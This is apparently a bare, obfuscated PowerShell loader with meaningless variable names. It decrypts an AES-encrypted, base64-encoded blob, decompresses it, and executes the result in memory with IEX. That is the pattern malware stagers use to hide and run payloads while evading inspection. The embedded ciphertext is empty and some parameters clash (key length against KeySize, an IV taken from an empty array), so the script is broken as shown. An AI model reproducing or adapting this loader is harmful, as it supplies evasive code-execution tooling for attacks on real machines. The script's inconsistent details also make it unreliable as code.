$syutik = New-Object "System.Security.Cryptography.AesManaged"
$qzaqdzsp = [System.Convert]::FromBase64String("EuTdTClIZfgop+J86JhcRfwbI5lULoXRcbiWy7siQW4=")
$sidj = [System.Convert]::FromBase64String("")
$syutik.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$syutik.KeySize = 192
$syutik.Key = $qzaqdzsp
$syutik.IV = $sidj[0..15]
$syutik.Mode = [System.Security.Cryptography.CipherMode]::ECB
$syutik.BlockSize = 128
$rrwdpnim = New-Object System.IO.MemoryStream(,$syutik.CreateDecryptor().TransformFinalBlock($sidj,16,$sidj.Length-16))
$bexdc = New-Object System.IO.MemoryStream
$banakdcj = New-Object System.IO.Compression.DeflateStream $rrwdpnim, ([IO.Compression.CompressionMode]::Decompress)
$banakdcj.CopyTo($bexdc)
$rrwdpnim.Close()
$afibh = [System.Text.Encoding]::UTF8.GetString($bexdc.ToArray())
$syutik.Dispose()
$banakdcj.Close()
IEX($afibh)
